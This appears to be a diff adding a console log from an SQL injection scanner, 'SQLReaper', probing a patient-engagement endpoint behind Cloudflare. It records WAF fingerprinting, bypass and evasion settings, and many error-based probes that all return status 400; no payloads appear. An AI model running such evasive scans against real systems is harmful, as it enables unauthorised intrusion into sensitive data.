@@ -1,0 +1,1929 @@
+
+[+] [v21] Adaptive Extraction ENABLED (mutation_engine=SQLMutationEngine)
+[+] [v21]   Max bypasses: 10
+[+] [v21]   WAF threshold: 30%
+[+] [v21]   Max recovery attempts: 15
+
+============================================================
+[SQLReaper v25] Scan starting 12:48:39 url='/patient_engagement/placem
+============================================================
+[+] [*] SQLReaper v26.0 starting — 6 DBMSes × 10 techniques × 300 payloads
+[+] [Estimate] 5 params  6 DBMS  ~21 techniques
+[+] [Estimate] ~819 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~10 minutes
+[*] Estimated scan time: 10m 55s (5 params × 6 DBMSes × 21 techniques, level=1)
+[+] [Session] Resuming from saved state: 0 params completed
+[!] StealthEngine: blocking detected, delay  1.2s
+[!] StealthEngine: blocking detected, delay  3.1s
+[!] StealthEngine: blocking detected, delay  7.8s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[+] ML WAF fingerprint: Cloudflare (conf=0.94)
+[+] ML WAF: Cloudflare
+[+] [v19] WAFMLBypassGenerator activated (WAF=Cloudflare, waf_bypass=5)
+[!] StealthEngine: 5 consecutive max-delay blocks — WAF not responding to delay strategy. Permanently disabling backoff, delay fixed at 0.5s (BUG-V198-STEALTH-SAWTOOTH FIX)
+[+] Safe-mode verification:
+ Ready to scan [oracle=timing_only]
+   WAF challenge page detected on clean request
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   No boolean/timing differentiation  TIMING_ONLY oracle
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   Use --playwright to handle JS challenge, or resolve manually
+[+] [OracleMode] Selected: timing_only
+[+] Pre-scan verification OK
+[+] [v19] Oracle mode confirmed: timing_only
+[*] [diag-cascade] _v14_cascade entered: url='/patient_engagement/placements?countr'
+[+] KB tamper chain: ['subquery_wrap', 'space2plus', 'case_variation_extended', 'commentbeforeparens', 'comment_content']
+[*] [diag-cascade] discovered params: ['country', 'variant', 'channel', 'target', 'limit', 'ssid', 'rum', 'expire'] markers=[]
+[*] Conformal calibration block complete, proceeding to causal discovery...
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+
+[*] ══════════════════════════════════════════════════════
+[*]  SCAN PLAN: 1 DBMS × 10 categories × 8 params × 3 methods
+[*]  DBMSes   : ['PostgreSQL']
+[*]  Params   : ['country', 'variant', 'channel', 'target', 'limit', 'ssid', 'rum', 'expire']
+[*]  Categories: ['Boolean', 'Timebased', 'Error', 'Union', 'Stacked', 'Standard', 'Novel', 'WAFBypass', 'Exotic', 'Hybrid']
+[*]  Payloads  : 300 per DBMS×category at level 1 = 3000 total
+[*] ══════════════════════════════════════════════════════
+
+[+]  Endpoint [1/1]: POST /patient_engagement/placements (8 params, source=direct)
+[*] A/B detection profiling for 'country'...
+[*] Stability profiling for 'country'...
+[*] [Classify] 'country'  sql_likely (response changes on SQL probes)
+[!] [TimingCal] CDN-cached baseline (P95=0.0ms < 5ms) — baseline probes served from edge cache.  Injection payloads bypass CDN cache and hit backend directly.  Jitter profiler will refine sleep estimate against real backend latency.
+[+] [TimingCal] Baseline: median=0ms P95=0ms IQR=0ms  optimal SLEEP=1.0s
+[Gate]  All 12 optimizations enabled
+[*] [RateCalibrate] Probing rate limits on /patient_engagement/placements?countr...
+[*] [RateCalibrate] User specified --rpm 60, respecting user setting
+[*] [RateCalibrate] Completed
+[*] [RDF] Profiling server response to suspicious headers (6 probes)...
+[+] [RDF] Result: SQL_SPECIFIC
+[+] [RDF] Headers: server reacts specifically to SQL
+[+] Launching expanded surfaces in parallel (WAF: Cloudflare)
+[*] [diag-task] creating primary task: param='country' orig='fr'
+[*] [HDR] Preparing 138 headers for batched scanning ( GET/POST/PUT  all techniques  all DBMS)...
+[*] [COOKIE] Probing for injectable cookies...
+[*] [diag-surface] scan_surface called: surface='POST:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'POST:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'country'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to BT,EX,ST,TH,T,WB,E,HQ,NV,HY,EH,S (was ALL)
+[*] [COOKIE] No Set-Cookie headers in response  skipping cookie injection
+[*] [HDR] Scanning 138 headers in batches of 2...
+[*] [diag-surface] scan_surface called: surface='HDR:X-Forwarded-For:POST' params=['X-Forwarded-For']
+[+] Scanning surface: 'HDR:X-Forwarded-For:POST' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='X-Forwarded-For' already_confirmed=False
+[*] --- testing 'X-Forwarded-For' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'X-Forwarded-For'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='X-Forwarded-For' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'X-Forwarded-For'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to BT,EX,ST,TH,T,WB,E,HQ,NV,HY,EH,S (was ALL)
+[*] [diag-surface] scan_surface called: surface='HDR:X-Real-IP:POST' params=['X-Real-IP']
+[+] Scanning surface: 'HDR:X-Real-IP:POST' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='X-Real-IP' already_confirmed=False
+[*] --- testing 'X-Real-IP' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'X-Real-IP'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='X-Real-IP' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'X-Real-IP'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to BT,EX,ST,TH,T,WB,E,HQ,NV,HY,EH,S (was ALL)
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/1]: PostgreSQL   | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] PostgreSQL base_tech_map non-empty: {'E': 2895, 'T': 2895, 'S': 2895, 'HQ': 2895, 'EH': 2895, 'TH': 2895, 'BT': 2895, 'WB': 2895, 'NV': 2895, 'EX': 2895, 'HY': 2895, 'ST': 2895}
+    [E] PostgreSQL: 2895 payloads
+    [T] PostgreSQL: 2895 payloads
+    [S] PostgreSQL: 2895 payloads
+    [HQ] PostgreSQL: 2895 payloads
+    [EH] PostgreSQL: 2895 payloads
+    [TH] PostgreSQL: 2895 payloads
+    [BT] PostgreSQL: 2895 payloads
+    [WB] PostgreSQL: 2895 payloads
+    [NV] PostgreSQL: 2895 payloads
+    [EX] PostgreSQL: 2895 payloads
+    [HY] PostgreSQL: 2895 payloads
+    [ST] PostgreSQL: 2895 payloads
+[*] │   Testing 12 technique codes in order: ['EH', 'ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S', 'E']
+[*] ├─ [3/10] PostgreSQL › Error      │ tech=EH   │ 577 base payloads (2895 expanded)
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/1]: PostgreSQL   | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] PostgreSQL base_tech_map non-empty: {'E': 2895, 'T': 2895, 'S': 2895, 'HQ': 2895, 'EH': 2895, 'TH': 2895, 'BT': 2895, 'WB': 2895, 'NV': 2895, 'EX': 2895, 'HY': 2895, 'ST': 2895}
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/1]: PostgreSQL   | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] PostgreSQL base_tech_map non-empty: {'E': 2895, 'T': 2895, 'S': 2895, 'HQ': 2895, 'EH': 2895, 'TH': 2895, 'BT': 2895, 'WB': 2895, 'NV': 2895, 'EX': 2895, 'HY': 2895, 'ST': 2895}
+[*] │   Testing 12 technique codes in order: ['EH', 'ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S', 'E']
+[*] ├─ [3/10] PostgreSQL › Error      │ tech=EH   │ 577 base payloads (2895 expanded)
+[*] │   Testing 12 technique codes in order: ['EH', 'ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S', 'E']
+[*] ├─ [3/10] PostgreSQL › Error      │ tech=EH   │ 577 base payloads (2895 expanded)
+[*] testing 'PostgreSQL header error-based' (param='country' req#1)
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#2)
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#3)
+    [EH-error] [PostgreSQL] req#1 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#4)
+    [EH-error] [PostgreSQL] req#1 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#5)
+    [EH-error] [PostgreSQL] req#1 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#6)
+    [EH-error] [PostgreSQL] req#2 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#7)
+    [EH-error] [PostgreSQL] req#2 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#8)
+    [EH-error] [PostgreSQL] req#2 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#9)
+    [EH-error] [PostgreSQL] req#3 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#10)
+    [EH-error] [PostgreSQL] req#3 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#11)
+    [EH-error] [PostgreSQL] req#3 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#12)
+    [EH-error] [PostgreSQL] req#4 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#13)
+    [EH-error] [PostgreSQL] req#4 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#14)
+    [EH-error] [PostgreSQL] req#4 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#15)
+    [EH-error] [PostgreSQL] req#5 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#16)
+    [EH-error] [PostgreSQL] req#5 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#17)
+    [EH-error] [PostgreSQL] req#5 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#18)
+    [EH-error] [PostgreSQL] req#6 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#19)
+    [EH-error] [PostgreSQL] req#6 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#20)
+    [EH-error] [PostgreSQL] req#6 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#21)
+    [EH-error] [PostgreSQL] req#7 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#22)
+    [EH-error] [PostgreSQL] req#7 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#23)
+    [EH-error] [PostgreSQL] req#7 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#24)
+    [EH-error] [PostgreSQL] req#8 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#25)
+    [EH-error] [PostgreSQL] req#8 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#26)
+    [EH-error] [PostgreSQL] req#8 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#27)
+    [EH-error] [PostgreSQL] req#9 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#28)
+    [EH-error] [PostgreSQL] req#9 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#29)
+    [EH-error] [PostgreSQL] req#9 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#30)
+    [EH-error] [PostgreSQL] req#10 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#31)
+    [EH-error] [PostgreSQL] req#10 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#32)
+    [EH-error] [PostgreSQL] req#10 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#33)
+    [EH-error] [PostgreSQL] req#11 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#34)
+    [EH-error] [PostgreSQL] req#11 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#35)
+    [EH-error] [PostgreSQL] req#11 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#36)
+    [EH-error] [PostgreSQL] req#12 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#37)
+    [EH-error] [PostgreSQL] req#12 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#38)
+    [EH-error] [PostgreSQL] req#12 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#39)
+    [EH-error] [PostgreSQL] req#13 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#40)
+    [EH-error] [PostgreSQL] req#13 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#41)
+    [EH-error] [PostgreSQL] req#13 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#42)
+    [EH-error] [PostgreSQL] req#14 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#43)
+    [EH-error] [PostgreSQL] req#14 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#44)
+    [EH-error] [PostgreSQL] req#14 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#45)
+    [EH-error] [PostgreSQL] req#15 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#46)
+    [EH-error] [PostgreSQL] req#15 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#47)
+    [EH-error] [PostgreSQL] req#15 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#48)
+    [EH-error] [PostgreSQL] req#16 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#49)
+    [EH-error] [PostgreSQL] req#16 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#50)
+    [EH-error] [PostgreSQL] req#16 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#51)
+    [EH-error] [PostgreSQL] req#17 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#52)
+    [EH-error] [PostgreSQL] req#17 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#53)
+    [EH-error] [PostgreSQL] req#17 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#54)
+    [EH-error] [PostgreSQL] req#18 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#55)
+    [EH-error] [PostgreSQL] req#18 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#56)
+    [EH-error] [PostgreSQL] req#19 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#57)
+    [EH-error] [PostgreSQL] req#18 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#58)
+    [EH-error] [PostgreSQL] req#19 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#59)
+    [EH-error] [PostgreSQL] req#20 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#60)
+    [EH-error] [PostgreSQL] req#20 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#61)
+    [EH-error] [PostgreSQL] req#19 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#62)
+    [EH-error] [PostgreSQL] req#21 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#63)
+    [EH-error] [PostgreSQL] req#20 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#64)
+    [EH-error] [PostgreSQL] req#21 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#65)
+    [EH-error] [PostgreSQL] req#22 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#66)
+    [EH-error] [PostgreSQL] req#21 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#67)
+    [EH-error] [PostgreSQL] req#22 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#68)
+    [EH-error] [PostgreSQL] req#23 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#69)
+    [EH-error] [PostgreSQL] req#22 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#70)
+    [EH-error] [PostgreSQL] req#23 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#71)
+    [EH-error] [PostgreSQL] req#24 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#72)
+    [EH-error] [PostgreSQL] req#23 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#73)
+    [EH-error] [PostgreSQL] req#25 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#74)
+    [EH-error] [PostgreSQL] req#24 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#75)
+    [EH-error] [PostgreSQL] req#24 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#76)
+    [EH-error] [PostgreSQL] req#26 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#77)
+    [EH-error] [PostgreSQL] req#25 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#78)
+    [EH-error] [PostgreSQL] req#25 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#79)
+    [EH-error] [PostgreSQL] req#27 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#80)
+    [EH-error] [PostgreSQL] req#26 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#81)
+    [EH-error] [PostgreSQL] req#26 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#82)
+    [EH-error] [PostgreSQL] req#28 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#83)
+    [EH-error] [PostgreSQL] req#27 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#84)
+    [EH-error] [PostgreSQL] req#27 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#85)
+    [EH-error] [PostgreSQL] req#29 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#86)
+    [EH-error] [PostgreSQL] req#28 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#87)
+    [EH-error] [PostgreSQL] req#30 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#88)
+    [EH-error] [PostgreSQL] req#28 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#89)
+    [EH-error] [PostgreSQL] req#29 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#90)
+    [EH-error] [PostgreSQL] req#31 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#91)
+    [EH-error] [PostgreSQL] req#29 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#92)
+    [EH-error] [PostgreSQL] req#32 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#93)
+    [EH-error] [PostgreSQL] req#30 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#94)
+    [EH-error] [PostgreSQL] req#30 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#95)
+    [EH-error] [PostgreSQL] req#33 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#96)
+    [EH-error] [PostgreSQL] req#31 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#97)
+    [EH-error] [PostgreSQL] req#31 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#98)
+    [EH-error] [PostgreSQL] req#34 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#99)
+    [EH-error] [PostgreSQL] req#32 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#100)
+    [EH-error] [PostgreSQL] req#32 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#101)
+    [EH-error] [PostgreSQL] req#33 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#102)
+    [EH-error] [PostgreSQL] req#35 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#103)
+    [EH-error] [PostgreSQL] req#33 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#104)
+    [EH-error] [PostgreSQL] req#34 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#105)
+    [EH-error] [PostgreSQL] req#36 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#106)
+    [EH-error] [PostgreSQL] req#34 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#107)
+    [EH-error] [PostgreSQL] req#35 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#108)
+    [EH-error] [PostgreSQL] req#37 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#109)
+    [EH-error] [PostgreSQL] req#35 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#110)
+    [EH-error] [PostgreSQL] req#36 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#111)
+    [EH-error] [PostgreSQL] req#36 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#112)
+    [EH-error] [PostgreSQL] req#37 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#113)
+    [EH-error] [PostgreSQL] req#38 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#114)
+    [EH-error] [PostgreSQL] req#37 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#115)
+    [EH-error] [PostgreSQL] req#39 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#116)
+    [EH-error] [PostgreSQL] req#38 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#117)
+    [EH-error] [PostgreSQL] req#38 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#118)
+    [EH-error] [PostgreSQL] req#40 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#119)
+    [EH-error] [PostgreSQL] req#39 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#120)
+    [EH-error] [PostgreSQL] req#39 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#121)
+    [EH-error] [PostgreSQL] req#40 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#122)
+    [EH-error] [PostgreSQL] req#40 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#123)
+    [EH-error] [PostgreSQL] req#41 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#124)
+    [EH-error] [PostgreSQL] req#41 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#125)
+    [EH-error] [PostgreSQL] req#41 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#126)
+    [EH-error] [PostgreSQL] req#42 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#127)
+    [EH-error] [PostgreSQL] req#42 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#128)
+    [EH-error] [PostgreSQL] req#42 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#129)
+    [EH-error] [PostgreSQL] req#43 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#130)
+    [EH-error] [PostgreSQL] req#43 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#131)
+    [EH-error] [PostgreSQL] req#43 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#132)
+    [EH-error] [PostgreSQL] req#44 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#133)
+    [EH-error] [PostgreSQL] req#44 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#134)
+    [EH-error] [PostgreSQL] req#44 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#135)
+    [EH-error] [PostgreSQL] req#45 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#136)
+    [EH-error] [PostgreSQL] req#45 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#137)
+    [EH-error] [PostgreSQL] req#45 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#138)
+    [EH-error] [PostgreSQL] req#46 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#139)
+    [EH-error] [PostgreSQL] req#46 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#140)
+    [EH-error] [PostgreSQL] req#46 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#141)
+    [EH-error] [PostgreSQL] req#47 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#142)
+    [EH-error] [PostgreSQL] req#47 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#143)
+    [EH-error] [PostgreSQL] req#47 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#144)
+    [EH-error] [PostgreSQL] req#48 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#145)
+    [EH-error] [PostgreSQL] req#48 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#146)
+    [EH-error] [PostgreSQL] req#48 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#147)
+    [EH-error] [PostgreSQL] req#49 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#148)
+    [EH-error] [PostgreSQL] req#49 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#149)
+    [EH-error] [PostgreSQL] req#49 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#150)
+    [EH-error] [PostgreSQL] req#50 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#151)
+    [EH-error] [PostgreSQL] req#50 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#152)
+    [EH-error] [PostgreSQL] req#51 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#153)
+    [EH-error] [PostgreSQL] req#51 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Forwarded-For' req#154)
+    [EH-error] [PostgreSQL] req#52 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='country' req#155)
+    [EH-error] [PostgreSQL] req#50 err=False status=400  no error
+[*] testing 'PostgreSQL header error-based' (param='X-Real-IP' req#156)
